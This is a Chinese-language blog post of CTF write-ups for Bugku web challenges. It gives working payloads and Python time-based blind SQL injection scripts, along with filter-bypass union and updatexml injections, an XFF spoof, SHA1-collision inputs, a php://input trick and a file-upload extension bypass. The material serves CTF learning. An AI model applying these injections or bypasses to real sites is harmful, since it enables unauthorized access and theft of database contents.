<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    
    <title>bugku writeup(Web2） | CherryGk&#39;s Blog | If you have any questions, please contact QQ1196821466 or leave message in the upper right.</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	false,
            lv: JSON.parse('{"enable":true,"app_id":"BgxLbK8bfVBhr3OOhIdHmoKz-gzGzoHsz","app_key":"twfcGffxeJ6Bfm4fpJUQ256M","icon":true}'),
            v: JSON.parse('{"enable":true,"appid":"BgxLbK8bfVBhr3OOhIdHmoKz-gzGzoHsz","appkey":"twfcGffxeJ6Bfm4fpJUQ256M","notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":"c1ada43c"}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.3.2"></script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname"></h5>
          <a href="mailto:1196821466@qq.com" title="1196821466@qq.com" class="mail">
            
              <span>1</span>
            
              <span>1</span>
            
              <span>9</span>
            
              <span>6</span>
            
              <span>8</span>
            
              <span>2</span>
            
              <span>1</span>
            
              <span>4</span>
            
              <span>6</span>
            
              <span>6</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                文章分类
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                标签
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                文章总览
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                关于
              </a>
            </li>
        
            <li class="">
              <a href="/links"  >
                <i class="icon icon-lg icon-plus-square"></i>
                友链
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>bugku writeup(Web2）</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">bugku writeup(Web2）</h1>
        <h5 class="subtitle">
            
                <time datetime="2018-06-06T08:10:51.000Z" itemprop="datePublished" class="page-time">
  2018-06-06
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-bugku2"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">bugku writeup(Web2）</h1>
        <div class="post-meta">
            <time class="post-time" title="2018-06-06 16:10:51" datetime="2018-06-06T08:10:51.000Z"  itemprop="datePublished">2018-06-06</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>



            
	<span id="/2018/06/06/bugku2/" class="leancloud_visitors" data-flag-title="bugku writeup(Web2）" title="bugku writeup(Web2）">
		
			<i class="icon icon-eye"></i>
		
		<span class="leancloud-visitors-count"></span>
	</span>
 

            
    <span class="leancloud-comment">
        <i class="icon icon-comment-o"></i>
        <a href="/2018/06/06/bugku2/#comment">
            <span class="valine-comment-count" data-xid="/2018/06/06/bugku2/"></span>
        </a>
    </span>



            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <h1 id="Web-2"><a href="#Web-2" class="headerlink" title="Web(2)"></a>Web(2)</h1><h2 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h2><p>题目提示md5，先试试弱类型比较的漏洞<code>240610708</code></p>
<p>直接拿到flag,payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/md5.php?a=240610708</span><br></pre></td></tr></table></figure></p>
<h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>题目提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请从本地访问!</span><br></pre></td></tr></table></figure></p>
<p>直接构造<code>XFF</code>,在消息头里加上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure></p>
<p>直接拿到flag</p>
<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>题目直接给了源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;flag.php&apos;); </span><br><span class="line">$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]); </span><br><span class="line">$flag = &apos;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&apos;; </span><br><span class="line">if (isset($_GET[&apos;uname&apos;]) and isset($_POST[&apos;passwd&apos;])) &#123; </span><br><span class="line">    if ($_GET[&apos;uname&apos;] == $_POST[&apos;passwd&apos;]) </span><br><span class="line"></span><br><span class="line">        print &apos;passwd can not be uname.&apos;; </span><br><span class="line"></span><br><span class="line">    else if (sha1($_GET[&apos;uname&apos;]) === sha1($_POST[&apos;passwd&apos;])&amp;($_GET[&apos;id&apos;]==&apos;margin&apos;)) </span><br><span class="line"></span><br><span class="line">        die(&apos;Flag: &apos;.$flag); </span><br><span class="line"></span><br><span class="line">    else </span><br><span class="line"></span><br><span class="line">        print &apos;sorry!&apos;; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>先解释一下代码，当<code>uname`</code>passwd<code>存在，并且两个值不能相等，但是他们俩的</code>sha1<code>值必须相等，原则上是不可能实现的，所以漏洞就在这产生了，
这题看到了</code>sha1()<code>，跟</code>md5()`不一样，所以需要<a href="https://blog.csdn.net/caiqiiqi/article/details/68953730" target="_blank" rel="noopener">SHA1碰撞</a>，我引用了这篇文章的两个hax</p>
<p>第一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure></p>
<p>第二个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure></p>
<p>有了这两个值之后就很好做了，代码本身并不难，记得最后跟上一个<code>id=margin</code></p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/30485545.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/30485545.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>题目也是给了代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line">if ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>先解释一下代码，<code>extract()</code>可以将数组的<code>键名</code>拆成<code>变量</code>，这里直接像平时一样传参即可，<br>并且必须存在<code>$ac</code>这个变量，然后<code>$f</code>这个变量是从<code>file_get_contents($fn)</code>中得到，所以你还需要传入<code>$fn</code>这个变量，如果<code>$ac</code>与<code>$f</code>相等的话，得到flag，但是这个相等绕过的可能性不大，<br>因为是三个等号，所以只能将另这两个值相等了。</p>
<p>两种解法：</p>
<ul>
<li>第一种</li>
</ul>
<p>直接扫后台，扫到一个名为<code>flag.txt</code>，并且内容是<code>flags</code><br>然后根据代码的意思将传入的<code>$ac</code>参数值置为<code>flags</code>,然后将<code>$fn</code>置为<code>flag.txt</code></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web8/?ac=flags&amp;fn=flag.txt</span><br></pre></td></tr></table></figure></p>
<ul>
<li>第二种</li>
</ul>
<p>利用伪协议，既然<code>$fn</code>可控的话，并且被包含，那么就能用伪协议了，payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web8/?ac=1&amp;fn=php://input</span><br><span class="line"></span><br><span class="line">POST:1</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/51244785.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/51244785.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>首先这题啥都没有，各种找都找不到入口，然后上御剑扫到了<code>robots.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /resusl.php</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/81926972.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/81926972.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<p>有个提示是管理员的，提交<code>x</code>为各种值都不行，然后提交为<code>admin</code>有反应了？wtf?</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/72058928.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/72058928.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>首先题目提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is margin,give me a image file not a php</span><br></pre></td></tr></table></figure></p>
<p>先上传个php试试，</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/32810460.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/32810460.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<p>直接提示了非法文件，然后我们将<code>扩展名</code>改为<code>jpg</code>试试</p>
<p>题目会提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You got it!:)</span><br></pre></td></tr></table></figure></p>
<p>能成功，但是题目没有回显路径或者flag,继续更改文件的类型为<code>image/jpeg</code>,<br>然后回显了路径：</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/22121514.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/22121514.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<p>但是已经被当成一张图片了，服务器无法解析，所以上菜刀是连不上的，<br>这个时候需要揣摩一下出题者的意图了，<br>提示里写了需要一个<code>image</code>，所以类型是肯定需要改成<code>image</code>的，<br>但是各种试都上传不上去，能成功上传的都被更改了后缀名,<br>所以更改一下<code>请求头</code>的<code>Content-Type</code>大小写，因为这道题的waf很严格，<br>导致了各种上传方式都失败，又因为对s上传的文件类型做了一点要求，<br>所以只能更改<code>后缀名</code>来得到flag，php别名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php2, php3, php4, php5, phps, pht, phtm, phtml …</span><br></pre></td></tr></table></figure></p>
<p>都可以试一下，当试到<code>php5</code>时，得到flag:</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/95684881.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/95684881.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<p>这里引用网上wp的一句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果是waf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，</span><br><span class="line">使得需要上传的文件可以到达服务器端，而服务器的容错率较高，</span><br><span class="line">一般我们上传的文件可以解析。</span><br></pre></td></tr></table></figure></p>
<h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p>题目提示：<br>不如写个python吧。。<br>估计大概率是盲注了，先放上代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip = &apos;&apos;;</span><br><span class="line">if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&#123;</span><br><span class="line">$ip = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(&apos;,&apos;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=&quot;localhost&quot;;</span><br><span class="line">$user=&quot;&quot;;</span><br><span class="line">$pass=&quot;&quot;;</span><br><span class="line">$db=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line">echo &apos;your ip is :&apos;.$ip;</span><br><span class="line">$sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure></p>
<p>分析一下代码，这段代码的意思先从<code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR</code>获得ip变量，<br>然后再执行<code>insert into</code>语句，所以这里的可控变量是$ip，也就是在请求包里构造<code>XFF</code>，<br>在<code>insert into注入</code>中，需要用到的sql语句是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when 条件 then 执行1 else 执行2</span><br></pre></td></tr></table></figure></p>
<p>再来看看代码过滤了什么:<br><code>explode(&#39;,&#39;, $ip)</code>可以发现逗号被过滤了，所以<code>substr()1,1</code>这样的方法行不通，<br>所以现在需要换一种方法<code>substr() from 1 for 1</code>,而且因为没有报错，所以只能是基于时间的盲注，<br>这时候需要用到<code>sleep()</code>和<code>timeout</code>,先上python代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">mystring = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web15/&apos;</span><br><span class="line">data = &quot;&apos;+(select case when (substring((select database() ) from &#123;0&#125; for 1)=&apos;&#123;1&#125;&apos;) then sleep(5) else 1 end)) #&quot;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,10):</span><br><span class="line">    for j in mystring:</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;&apos;x-forwarded-for&apos;:data.format(str(i),j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=3)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">print(&apos;The database name is &apos;+flag)</span><br></pre></td></tr></table></figure></p>
<p>这段代码的作用是查出来数据库的名字，后面的步骤也就跟普通的盲注一样了，<br>得到表名代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">mystring = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web15/&apos;</span><br><span class="line">data = &quot;&apos;+(select case when (substring((select table_name from information_schema.tables where table_schema= &apos;web15&apos; limit 1 offset &#123;0&#125;) from &#123;1&#125; for 1)=&apos;&#123;2&#125;&apos;) then sleep(5) else 1 end)) #&quot;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">tables = []</span><br><span class="line">for x in range(0,5):</span><br><span class="line">	tables.append(flag)</span><br><span class="line">	flag = &apos;&apos;</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">	    for j in mystring:</span><br><span class="line">	        try:</span><br><span class="line">	            headers = &#123;&apos;x-forwarded-for&apos;:data.format(str(x),str(i),j)&#125;</span><br><span class="line">	            res = requests.get(url,headers=headers,timeout=3)</span><br><span class="line">	        except requests.exceptions.ReadTimeout:</span><br><span class="line">	            flag += j</span><br><span class="line">	            print(flag)</span><br><span class="line">	            break</span><br><span class="line"></span><br><span class="line">print(&apos;The database name is &apos;+&apos;&apos;.join(tables))</span><br></pre></td></tr></table></figure></p>
<p>列名也是一样的道理，所以只放出最后的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">mystring = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web15/&apos;</span><br><span class="line">data = &quot;&apos;+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)=&apos;&#123;1&#125;&apos;) then sleep(5) else 1 end)) #&quot;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,35):</span><br><span class="line">    for j in mystring:</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;&apos;x-forwarded-for&apos;:data.format(str(i),j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=4)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>
<p>最后可以得到flag</p>
<h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p>很基础的注入题，payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; union select flag1,2 from flag1 #</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/46039219.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/46039219.jpg" alt="" title="" class=""></a>
                <p></p>
            </figure>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>首先各种试了之后全是<code>error</code>，在这样尝试之后发现没有报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=1&apos;  aandnd 1=1 %23</span><br></pre></td></tr></table></figure></p>
<p>估计后面全是双写绕过，然后就变成了一个很普通的<code>联合注入</code>，所以最终的payload是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1&apos; ununionion selselectect 1,flag1 from flag1%23</span><br></pre></td></tr></table></figure></p>
<p>但是这个flag是一串乱码。。是第一个flag，在找列的时候还看到一个<code>address列</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1&apos; ununionion selselectect 1,address from flag1%23</span><br></pre></td></tr></table></figure></p>
<p>可以得到下一关的通关地址<code>Once_More.php</code></p>
<p>这一关双写union也没办法绕过，所以试了一下<code>updatexml</code>，报错注入，<br>这里大概简述一下updatexml报错注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br></pre></td></tr></table></figure></p>
<p>来看看这题的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<p><code>concat</code>函数会把中间的参数连接成字符串，比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(hello,world,!)</span><br></pre></td></tr></table></figure></p>
<p>很容易理解，返回的是<code>helloworld!</code>，<br>然后又因为<code>UPDATEXML</code>函数的第二个参数需要的是xml格式的字符串，<br>我这里提交的是<code>~sql语句~</code>,是不符合xml格式的，所以会报错。<br>得到表名：</p>
<figure class="image-box">
                <a rel=bugku writeup(Web2） href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/47831981.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/47831981.jpg" alt="" title="" class=""></a>
                <p></p>
